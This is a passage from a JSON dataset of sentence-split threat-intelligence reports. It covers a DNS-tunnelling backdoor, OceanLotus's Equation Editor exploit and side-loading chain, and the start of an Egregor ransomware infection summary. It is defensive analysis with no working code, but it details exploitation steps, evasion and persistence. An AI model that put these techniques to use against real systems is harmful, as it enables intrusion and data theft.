        "id": "cti_reports_filtered/r-1025.md:::S40",
        "text": "If the command received from the DNS query consists of a string: \u201cuploaddd\u201d, it uploads the local file on the disk using UploadFileAsync() function to an External URL after parsing the TXT record response value into two variables: uriString (external URL) and filename (Local File).",
        "type": "",
        "report": "r-1025",
        "line": 40,
        "index": 2932
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S41",
        "text": "This functionality can be leveraged to exfiltrate data.",
        "type": "",
        "report": "r-1025",
        "line": 41,
        "index": 2933
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S42",
        "text": "Command Execution -",
        "type": "",
        "report": "r-1025",
        "line": 42,
        "index": 2934
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S43",
        "text": "If none of the above strings match the TXT record response then the response is passed on to the Command execution routine.",
        "type": "",
        "report": "r-1025",
        "line": 43,
        "index": 2935
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S44",
        "text": "There, the response to the txt record is executed as a command on the infected machine using \u201ccmd.exe /c <txt_record_response_command>\u201d and the command output is sent across to the C2 server in the form of DNS A Records.",
        "type": "",
        "report": "r-1025",
        "line": 44,
        "index": 2936
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S45",
        "text": "In this case, the TXT record response we received for the DNS query performed against the attacker controlled DNS server is \u201cipconfig\u201d.",
        "type": "",
        "report": "r-1025",
        "line": 45,
        "index": 2937
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S46",
        "text": "This response initiates the Command execution routine of the backdoor and thus the command \u201cipconfig\u201d would be executed on the infected machine - cmd.exe /c ipconfig\n",
        "type": "",
        "report": "r-1025",
        "line": 46,
        "index": 2938
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S47",
        "text": "Further, the command output is exfiltrated to the C2 server, encoded in Base64 and then concatenated with the Communication ID and the previously generated BotUID using \u201c$\u201d as the separator.",
        "type": "",
        "report": "r-1025",
        "line": 47,
        "index": 2939
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S48",
        "text": "Once the command output is encoded in the above mentioned pattern, the DNS backdoor then sends across the output to the C2 server via DNS query in the form of A records in multiple blocks of queries, where the A record values consists of the encoded command output.",
        "type": "",
        "report": "r-1025",
        "line": 48,
        "index": 2940
    },
    {
        "id": "cti_reports_filtered/r-1025.md:::S49",
        "text": "Once the command output is transmitted completely, an \u201cEnddd\u201d command is sent across in a Base64-encoded data exfil pattern to notify the end of the command output as shown below in the screenshot.",
        "type": "",
        "report": "r-1025",
        "line": 49,
        "index": 2941
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S0",
        "text": "This document FW Report on demonstration of former CNRP in Republic of Korea.doc (SHA-1: D1357B284C951470066AAA7A8228190B88A5C7C3) is similar to the one mentioned in the article above, and also interesting as it really targets people interested in Cambodian politics (the CNRP \u2013 Cambodia National Rescue Party \u2013 political party was dissolved in late 2017).",
        "type": "",
        "report": "r-1040",
        "line": 0,
        "index": 2942
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S1",
        "text": "Despite its .doc extension, the document is actually in RTF format (see Figure 1), contains many garbage groups, and is also malformed.",
        "type": "",
        "report": "r-1040",
        "line": 1,
        "index": 2943
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S2",
        "text": "Despite the presence of malformed elements, Word successfully opens this RTF file.",
        "type": "",
        "report": "r-1040",
        "line": 2,
        "index": 2944
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S3",
        "text": "As seen in (Figure 2), at offset 0xC00 there is an EQNOLEFILEHDR structure, followed by the MTEF header and then an MTEF record (Figure 3) for a font.",
        "type": "",
        "report": "r-1040",
        "line": 3,
        "index": 2945
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S4",
        "text": "An overflow in the name field is possible because its size isn\u2019t checked before being copied.",
        "type": "",
        "report": "r-1040",
        "line": 4,
        "index": 2946
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S5",
        "text": "A name that is too long triggers the vulnerability.",
        "type": "",
        "report": "r-1040",
        "line": 5,
        "index": 2947
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S6",
        "text": "As seen in the RTF file content (offset 0xC26 in Figure 2), the buffer is filled with shellcode followed by a NOP (0x90) sled and the return address 0x402114.",
        "type": "",
        "report": "r-1040",
        "line": 6,
        "index": 2948
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S7",
        "text": "That address is a gadget in EQNEDT32.exe pointing to a RET instruction.",
        "type": "",
        "report": "r-1040",
        "line": 7,
        "index": 2949
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S8",
        "text": "This results in EIP pointing at the beginning of the name field which contains the shellcode.",
        "type": "",
        "report": "r-1040",
        "line": 8,
        "index": 2950
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S9",
        "text": "The address 0x45BD3C stores a variable that is dereferenced until it reaches a pointer to the currently loaded MTEFData structure.",
        "type": "",
        "report": "r-1040",
        "line": 9,
        "index": 2951
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S10",
        "text": "That is where the rest of the shellcode resides.\n",
        "type": "",
        "report": "r-1040",
        "line": 10,
        "index": 2952
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S11",
        "text": "The purpose of the shellcode is to execute a second piece of shellcode, embedded inside the open document.",
        "type": "",
        "report": "r-1040",
        "line": 11,
        "index": 2953
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S12",
        "text": "First, the initial shellcode tries to find the handle of the open document file by iterating through all the system\u2019s handles (NtQuerySystemInformation with the SystemExtendedHandleInformation argument) and checking if the handle\u2019s PID matches the PID of a WinWord process and if the document was opened with the following access mask: 0x12019F. To confirm it found the right handle and not the handle of another open document, the content of the file is mapped with the CreateFileMapping function and the shellcode checks if the last four bytes of the document are \u201cyyyy\u201c; this technique is called \u201cEgg Hunting\u201d.",
        "type": "",
        "report": "r-1040",
        "line": 12,
        "index": 2954
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S13",
        "text": "Once it finds a match, the document is copied to a temporary folder (GetTempPath) as ole.dll.",
        "type": "",
        "report": "r-1040",
        "line": 13,
        "index": 2955
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S14",
        "text": "Then the last 12 bytes of the document are read.",
        "type": "",
        "report": "r-1040",
        "line": 14,
        "index": 2956
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S15",
        "text": "The 32-bit value between the AABBCCDD and yyyy markers is the offset to the next shellcode.",
        "type": "",
        "report": "r-1040",
        "line": 15,
        "index": 2957
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S16",
        "text": "It is invoked using the CreateThread function.",
        "type": "",
        "report": "r-1040",
        "line": 16,
        "index": 2958
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S17",
        "text": "The extracted shellcode is the same that the OceanLotus group has been using for a while now.",
        "type": "",
        "report": "r-1040",
        "line": 17,
        "index": 2959
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S18",
        "text": "The Python emulator script we released in March 2018 still works to dump the next stage.",
        "type": "",
        "report": "r-1040",
        "line": 18,
        "index": 2960
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S19",
        "text": "The filenames and directories are chosen dynamically.",
        "type": "",
        "report": "r-1040",
        "line": 19,
        "index": 2961
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S20",
        "text": "The code randomly selects the filename of an executable or DLL file located in C:\\Windows\\system32.",
        "type": "",
        "report": "r-1040",
        "line": 20,
        "index": 2962
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S21",
        "text": "It will then query its resources and extract the FileDescription field to use as a folder name.",
        "type": "",
        "report": "r-1040",
        "line": 21,
        "index": 2963
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S22",
        "text": "If this does not work, the code randomly chooses a folder name from the %ProgramFiles% or C:\\Windows (from GetWindowsDirectoryW) directories.",
        "type": "",
        "report": "r-1040",
        "line": 22,
        "index": 2964
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S23",
        "text": "It avoids using a name that may clash with existing files by making sure it does not contain: windows, Microsoft, desktop, system, system32 or syswow64.",
        "type": "",
        "report": "r-1040",
        "line": 23,
        "index": 2965
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S24",
        "text": "If the directory already exists, the directory name is appended with \u201cNLS_{6 digits}\u201d.",
        "type": "",
        "report": "r-1040",
        "line": 24,
        "index": 2966
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S25",
        "text": "The stage\u2019s 0x102 resource is parsed and the files are dropped in either %ProgramFiles% or %AppData% in the randomly chosen folder.",
        "type": "",
        "report": "r-1040",
        "line": 25,
        "index": 2967
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S26",
        "text": "The creation times are changed to have the same values as kernel32.dll.\n",
        "type": "",
        "report": "r-1040",
        "line": 26,
        "index": 2968
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S27",
        "text": "For example, here is a folder and a list of files created by picking the C:\\Windows\\system32\\TCPSVCS.exe executable as a source of data.",
        "type": "",
        "report": "r-1040",
        "line": 27,
        "index": 2969
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S28",
        "text": "The structure of the resource 0x102 in the dropper is quite complex.",
        "type": "",
        "report": "r-1040",
        "line": 28,
        "index": 2970
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S29",
        "text": "In a nutshell, it contains:\n",
        "type": "",
        "report": "r-1040",
        "line": 29,
        "index": 2971
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S30",
        "text": "- filenames\n",
        "type": "",
        "report": "r-1040",
        "line": 30,
        "index": 2972
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S31",
        "text": "- files\u2019 size and content\n",
        "type": "",
        "report": "r-1040",
        "line": 31,
        "index": 2973
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S32",
        "text": "- compression format ( COMPRESSION_FORMAT_LZNT1 used by RtlDecompressBuffer function)\n",
        "type": "",
        "report": "r-1040",
        "line": 32,
        "index": 2974
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S33",
        "text": "The first file is dropped as TCPSVCS.exe which is in fact Adobe\u2019s legitimate AcroTranscoder.exe (according to its FileDescription, SHA-1: 2896738693A8F36CC7AD83EF1FA46F82F32BE5A3).",
        "type": "",
        "report": "r-1040",
        "line": 33,
        "index": 2975
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S34",
        "text": "You may have noticed that the file size of some DLLs exceeds 11MB.",
        "type": "",
        "report": "r-1040",
        "line": 34,
        "index": 2976
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S35",
        "text": "This is because a large contiguous buffer of random data is placed inside the executable.",
        "type": "",
        "report": "r-1040",
        "line": 35,
        "index": 2977
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S36",
        "text": "It is possibly a way to evade detection by some security products.\n",
        "type": "",
        "report": "r-1040",
        "line": 36,
        "index": 2978
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S37",
        "text": "The resource 0x101 of the dropper contains two 32-bit integers that dictate how the persistence should be implemented.",
        "type": "",
        "report": "r-1040",
        "line": 37,
        "index": 2979
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S38",
        "text": "The value of the first one specifies how the malware will achieve persistence without administrator privileges.",
        "type": "",
        "report": "r-1040",
        "line": 38,
        "index": 2980
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S39",
        "text": "The value of the second integer specifies how the malware should try to achieve persistence if it runs with elevated privileges.",
        "type": "",
        "report": "r-1040",
        "line": 39,
        "index": 2981
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S40",
        "text": "The service name is the filename without extension; the display name is the folder name but if it already exists then the string \u201cRevision 1\u201d is appended (the number is incremented until it finds an unused name).",
        "type": "",
        "report": "r-1040",
        "line": 40,
        "index": 2982
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S41",
        "text": "The operators made sure the persistence through the service would be resilient: on service failure, the service should restart after 1 second.",
        "type": "",
        "report": "r-1040",
        "line": 41,
        "index": 2983
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S42",
        "text": "Then, the registry value WOW64 of the new service key is set to 4 which indicates that it\u2019s a 32-bit service.",
        "type": "",
        "report": "r-1040",
        "line": 42,
        "index": 2984
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S43",
        "text": "The scheduled task is created via several COM interfaces: ITaskScheduler, ITask, ITaskTrigger, IPersistFile and ITaskScheduler.",
        "type": "",
        "report": "r-1040",
        "line": 43,
        "index": 2985
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S44",
        "text": "Essentially, the malware creates a hidden task, sets the account information with the current user or the administrator information and sets the trigger.\n",
        "type": "",
        "report": "r-1040",
        "line": 44,
        "index": 2986
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S45",
        "text": "This is a daily task with a duration of 24 hours and the interval between two executions is set to 10 minutes, which means it will run all the time.\n",
        "type": "",
        "report": "r-1040",
        "line": 45,
        "index": 2987
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S46",
        "text": "In our example, the executable TCPSVCS.exe (AcroTranscoder.exe) is legitimate software side-loading the DLLs that were dropped with it.",
        "type": "",
        "report": "r-1040",
        "line": 46,
        "index": 2988
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S47",
        "text": "In this case, the Flash Video Extension.dll is the interesting one.",
        "type": "",
        "report": "r-1040",
        "line": 47,
        "index": 2989
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S48",
        "text": "Its DLLMain function just calls a single function.",
        "type": "",
        "report": "r-1040",
        "line": 48,
        "index": 2990
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S49",
        "text": "Some opaque predicates are present:\n",
        "type": "",
        "report": "r-1040",
        "line": 49,
        "index": 2991
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S50",
        "text": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:\n",
        "type": "",
        "report": "r-1040",
        "line": 50,
        "index": 2992
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S51",
        "text": "At the end, a CALL instruction to the address of the function FLVCore::Uninitialize(void) exported by Flash Video Extension.dll is appended.",
        "type": "",
        "report": "r-1040",
        "line": 51,
        "index": 2993
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S52",
        "text": "This means that, after loading the malicious DLL, when the runtime calls WinMain in TCPSVCS.exe, the instruction pointer will point to the NOP sled, which will eventually call FLVCore::Uninitialize(void), the next stage.",
        "type": "",
        "report": "r-1040",
        "line": 52,
        "index": 2994
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S53",
        "text": "This function simply creates a mutex starting with{181C8480-A975-411C-AB0A-630DB8B0A221}and followed by the current username.",
        "type": "",
        "report": "r-1040",
        "line": 53,
        "index": 2995
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S54",
        "text": "Then, it reads the dropped file with the .db3 extension, which contains position-independent code, and uses CreateThread to execute its content.",
        "type": "",
        "report": "r-1040",
        "line": 54,
        "index": 2996
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S55",
        "text": "The content of the .db3 file is shellcode commonly used by OceanLotus.",
        "type": "",
        "report": "r-1040",
        "line": 55,
        "index": 2997
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S56",
        "text": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.\n",
        "type": "",
        "report": "r-1040",
        "line": 56,
        "index": 2998
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S57",
        "text": "The script extracts the final stage.",
        "type": "",
        "report": "r-1040",
        "line": 57,
        "index": 2999
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S58",
        "text": "This component is the backdoor that we already analysed in this white paper: OceanLotus: Old techniques, new backdoor.",
        "type": "",
        "report": "r-1040",
        "line": 58,
        "index": 3000
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S59",
        "text": "It is recognizable as such from the GUID {A96B020F-0000-466F-A96D-A91BBF8EAC96} that is present in the binary.",
        "type": "",
        "report": "r-1040",
        "line": 59,
        "index": 3001
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S60",
        "text": "The configuration of the malware is still encrypted in a PE resource.",
        "type": "",
        "report": "r-1040",
        "line": 60,
        "index": 3002
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S61",
        "text": "It contains almost the same configuration but the C&C servers are different from the ones that were already published:\n",
        "type": "",
        "report": "r-1040",
        "line": 61,
        "index": 3003
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S62",
        "text": "Once again OceanLotus showcases a large combination of techniques to stay under the radar.",
        "type": "",
        "report": "r-1040",
        "line": 62,
        "index": 3004
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S63",
        "text": "They came back with a \u201cbetter\u201d version of the infection process.",
        "type": "",
        "report": "r-1040",
        "line": 63,
        "index": 3005
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S64",
        "text": "By choosing random names and filling executables with random data, they reduce the number of reliable IoCs (hash-based and filename-based).",
        "type": "",
        "report": "r-1040",
        "line": 64,
        "index": 3006
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S65",
        "text": "Moreover, since they\u2019re using DLL side-loading, the attackers only have to drop the legitimate AcroTranscoder binary as-is.\n",
        "type": "",
        "report": "r-1040",
        "line": 65,
        "index": 3007
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S66",
        "text": "After using RTF files, the group started using self-extracting (SFX) archives that use common document icons in an attempt to further mislead their victims.",
        "type": "",
        "report": "r-1040",
        "line": 66,
        "index": 3008
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S67",
        "text": "It was briefly documented by Threatbook (in Chinese).",
        "type": "",
        "report": "r-1040",
        "line": 67,
        "index": 3009
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S68",
        "text": "When run, these self-extracting RAR files drop and execute DLL files (with a .ocx extension) with the final payload being the previously documented {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll.",
        "type": "",
        "report": "r-1040",
        "line": 68,
        "index": 3010
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S69",
        "text": "Since the middle of January 2019, OceanLotus began reusing the technique but changed some configuration over time.",
        "type": "",
        "report": "r-1040",
        "line": 69,
        "index": 3011
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S70",
        "text": "This section will describe the technique and what they have altered to achieve their goal.",
        "type": "",
        "report": "r-1040",
        "line": 70,
        "index": 3012
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S71",
        "text": "The document THICH-THONG-LAC-HANH-THAP-THIEN-VIET-NAM (1).EXE (meaning \u201cFAVORITE RELATIONSHIP OF VIETNAMESE PERFORMANCE\u201d according to Google Translate, SHA-1: AC10F5B1D5ECAB22B7B418D6E98FA18E32BBDEAB) was first seen in 2018.",
        "type": "",
        "report": "r-1040",
        "line": 71,
        "index": 3013
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S72",
        "text": "This SFX file is cleverly crafted, as the description (Version Info) states it\u2019s a \u201cJPEG Image\u201d.",
        "type": "",
        "report": "r-1040",
        "line": 72,
        "index": 3014
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S73",
        "text": "The script of the SFX is the following:\n",
        "type": "",
        "report": "r-1040",
        "line": 73,
        "index": 3015
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S74",
        "text": "The malware drops {9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (SHA-1: EFAC23B0E6395B1178BCF7086F72344B24C04DCC) as well as the image 2018 thich thong lac.jpg.\n",
        "type": "",
        "report": "r-1040",
        "line": 74,
        "index": 3016
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S75",
        "text": "The decoy image is the following:\n",
        "type": "",
        "report": "r-1040",
        "line": 75,
        "index": 3017
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S76",
        "text": "You may have noticed the first two lines in the SFX script invoke the OCX file twice, but it is not a mistake\u2026\n",
        "type": "",
        "report": "r-1040",
        "line": 76,
        "index": 3018
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S77",
        "text": "The OCX file\u2019s control flow is very similar to other OceanLotus components: there are a lot of JZ/JNZ and PUSH/RET instruction sequences interleaved with junk code.",
        "type": "",
        "report": "r-1040",
        "line": 77,
        "index": 3019
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S78",
        "text": "After filtering the junk code, the export DllRegisterServer called by regsvr32.exe looks like this:\n",
        "type": "",
        "report": "r-1040",
        "line": 78,
        "index": 3020
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S79",
        "text": "Basically, the first time the DllRegisterServer is called, it sets the registry value HKCU\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model to an encoded offset in the DLL (0x10001DE0).",
        "type": "",
        "report": "r-1040",
        "line": 79,
        "index": 3021
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S80",
        "text": "The second time the function is called, it reads this very same value and executes the function at that address.",
        "type": "",
        "report": "r-1040",
        "line": 80,
        "index": 3022
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S81",
        "text": "From there, the resource is read and executed and many in-memory operations are executed.\n",
        "type": "",
        "report": "r-1040",
        "line": 81,
        "index": 3023
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S82",
        "text": "The shellcode is the same PE loader used in the earlier OceanLotus campaigns.",
        "type": "",
        "report": "r-1040",
        "line": 82,
        "index": 3024
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S83",
        "text": "It can be emulated with our miasm emulation script.",
        "type": "",
        "report": "r-1040",
        "line": 83,
        "index": 3025
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S84",
        "text": "Ultimately, it drops db293b825dcc419ba7dc2c49fa2757ee.dll, loads it into memory and executes DllEntry.\n",
        "type": "",
        "report": "r-1040",
        "line": 84,
        "index": 3026
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S85",
        "text": "The DLL retrieves the content of its resource, decrypts (AES-256-CBC) and decompresses it (LZMA).",
        "type": "",
        "report": "r-1040",
        "line": 85,
        "index": 3027
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S86",
        "text": "The resource has a specific format that is quite easy to reverse engineer.",
        "type": "",
        "report": "r-1040",
        "line": 86,
        "index": 3028
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S87",
        "text": "The configuration is explicit: depending on the privilege level, the binary data will be written to either %appdata%\\Intel\\logs\\BackgroundUploadTask.cpl or %windir%\\System32\\BackgroundUploadTask.cpl (or SysWOW64 for 64-bit systems).",
        "type": "",
        "report": "r-1040",
        "line": 87,
        "index": 3029
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S88",
        "text": "Next, persistence is achieved by creating a task named BackgroundUploadTask[junk].job where a [junk]is a collection of 0x9D and 0xA0 bytes.\n",
        "type": "",
        "report": "r-1040",
        "line": 88,
        "index": 3030
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S89",
        "text": "The application name of the task is %windir%\\System32\\control.exe and the parameter value is the path of the dumped binary.",
        "type": "",
        "report": "r-1040",
        "line": 89,
        "index": 3031
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S90",
        "text": "The hidden task is set to run every day.\n",
        "type": "",
        "report": "r-1040",
        "line": 90,
        "index": 3032
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S91",
        "text": "Structurally, the CPL file is a DLL whose internal name is ac8e06de0a6c4483af9837d96504127e.dll and that exports a CPlApplet function.",
        "type": "",
        "report": "r-1040",
        "line": 91,
        "index": 3033
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S92",
        "text": "This file decrypts its only resource {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll, then loads that DLL and calls its only export, DllEntry.\n",
        "type": "",
        "report": "r-1040",
        "line": 92,
        "index": 3034
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S93",
        "text": "The backdoor has an encrypted configuration embedded in its resources.",
        "type": "",
        "report": "r-1040",
        "line": 93,
        "index": 3035
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S94",
        "text": "The structure of the configuration file is quite similar to the previous one.\n",
        "type": "",
        "report": "r-1040",
        "line": 94,
        "index": 3036
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S95",
        "text": "Despite the structural similarity, of the values in many of these fields have been updated comparing this to that in our white paper from March 2018.\n",
        "type": "",
        "report": "r-1040",
        "line": 95,
        "index": 3037
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S96",
        "text": "The first element of the binaries array contains a DLL (HttpProv.dll MD5: 2559738D1BD4A999126F900C7357B759) identified by Tencent but as the export name has been removed from the binary, the hashes don\u2019t match.",
        "type": "",
        "report": "r-1040",
        "line": 96,
        "index": 3038
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S97",
        "text": "While hunting for samples, a few characteristics stood out.",
        "type": "",
        "report": "r-1040",
        "line": 97,
        "index": 3039
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S98",
        "text": "The sample just analysed appeared around July 2018 and other similar were found very recently in mid-January through early-February 2019.",
        "type": "",
        "report": "r-1040",
        "line": 98,
        "index": 3040
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S99",
        "text": "The infection vector used was an SFX archive dumping a legitimate, decoy document and a malicious OCX file.",
        "type": "",
        "report": "r-1040",
        "line": 99,
        "index": 3041
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S100",
        "text": "Even though OceanLotus uses fake timestamps, it has been observed that the timestamp of the SFX and OCX files are always the same (0x57B0C36A (08/14/2016 @ 7:15pm UTC) and 0x498BE80F (02/06/2009 @ 7:34am UTC) respectively).",
        "type": "",
        "report": "r-1040",
        "line": 100,
        "index": 3042
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S101",
        "text": "This probably means that they have some kind of \u201cbuilder\u201d that reuses the same templates and just changes some characteristics.",
        "type": "",
        "report": "r-1040",
        "line": 101,
        "index": 3043
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S102",
        "text": "Among the documents we analysed since early-2018, we saw different document names suggesting country-related targeting:\n",
        "type": "",
        "report": "r-1040",
        "line": 102,
        "index": 3044
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S103",
        "text": "Since the discovery of the {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll backdoor and its public analysis by multiple researchers, we observed some changes in the malware\u2019s configuration data.",
        "type": "",
        "report": "r-1040",
        "line": 103,
        "index": 3045
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S104",
        "text": "First, the authors started removing the names from the helper DLLs (DNSprov.dll and the two versions of HttpProv.dll).",
        "type": "",
        "report": "r-1040",
        "line": 104,
        "index": 3046
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S105",
        "text": "Then the operators stopped packaging the third DLL (second version of HttpProv.dll), choosing to embed just one.\n",
        "type": "",
        "report": "r-1040",
        "line": 105,
        "index": 3047
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S106",
        "text": "Second, a lot of the backdoor configuration fields have been changed, perhaps to avoid detection, since many IoCs became available.\n",
        "type": "",
        "report": "r-1040",
        "line": 106,
        "index": 3048
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S107",
        "text": "The important fields that changed are the following:\n",
        "type": "",
        "report": "r-1040",
        "line": 107,
        "index": 3049
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S108",
        "text": "- the \u201cAppX\u201d registry key changed (see IoCs)\n",
        "type": "",
        "report": "r-1040",
        "line": 108,
        "index": 3050
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S109",
        "text": "- the mutex encoding string (\u201cdef\u201d, \u201cabc\u201d, \u201cghi\u201d)\n",
        "type": "",
        "report": "r-1040",
        "line": 109,
        "index": 3051
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S110",
        "text": "- the port number\n",
        "type": "",
        "report": "r-1040",
        "line": 110,
        "index": 3052
    },
    {
        "id": "cti_reports_filtered/r-1040.md:::S111",
        "text": "Finally, all the new variants analysed have new C&C servers, which are listed in the IoCs section.\n",
        "type": "",
        "report": "r-1040",
        "line": 111,
        "index": 3053
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S0",
        "text": "Since Egregor is a relatively new player in the game, not many incidents involving it are covered and detailed here, including information about the infection chain.",
        "type": "",
        "report": "r-1074",
        "line": 0,
        "index": 3054
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S1",
        "text": "The information available so far suggests that the initial infection starts with a phishing email that contains a malicious macro embedded in an attached document.",
        "type": "",
        "report": "r-1074",
        "line": 1,
        "index": 3055
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S2",
        "text": "The macro code downloads a commodity malware, either Qbot icedID or Ursnif, which provides capabilities for stealing sensitive information that will later be used for lateral movement.",
        "type": "",
        "report": "r-1074",
        "line": 2,
        "index": 3056
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S3",
        "text": "This technique, which involves using a commodity malware as initial infection and to eventually deliver ransomware, was observed before with Ryuk ransomware and Maze.\n",
        "type": "",
        "report": "r-1074",
        "line": 3,
        "index": 3057
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S4",
        "text": "Later in the attack, a CobaltStrike beacon is installed on the infected machine and the attack shifts to an interactive hacking operation.",
        "type": "",
        "report": "r-1074",
        "line": 4,
        "index": 3058
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S5",
        "text": "The attacker uses tools for reconnaissance such as Adfind and Sharphound to gather information about users, groups, computers and so on.",
        "type": "",
        "report": "r-1074",
        "line": 5,
        "index": 3059
    },
    {
        "id": "cti_reports_filtered/r-1074.md:::S6",
